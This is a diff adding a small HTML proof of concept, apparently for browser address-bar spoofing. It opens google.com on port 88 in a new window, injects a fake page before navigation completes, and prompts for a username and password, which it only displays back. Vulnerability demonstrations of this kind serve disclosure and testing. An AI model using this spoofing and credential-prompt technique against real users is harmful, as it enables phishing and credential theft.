@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <button onclick="spoof()">Click to spoof</button>
+
+    <script>
+      function spoof() {
+        // Detect iOS (iPhone / iPad)
+        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+        if (isIOS) {
+          alert("iOS detected.\nPlease allow pop-ups to continue.");
+        }
+
+        // Buka jendela baru pointing ke target (akan menjadi spoofed URL)
+        let win = window.open("https://www.google.com:88", "_blank");
+
+        // Setelah 50ms, injeksikan konten sebelum navigasi selesai
+        setTimeout(() => {
+          try {
+            win.document.write(`
+  <h1>This is not Google!</h1>
+<button onclick="
+  let username = prompt('Enter your username');
+  let password = prompt('Enter your password');
+  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+">Click me</button>
+            `);
+            win.document.close();
+          } catch (e) {
+            console.warn("Blocked by browser protections:", e);
+            if (isIOS) alert("Popup blocked by Safari.\nEnable pop-ups and try again.");
+          }
+        }, 50);
+      }
+    </script>
+  </body>
+</html>
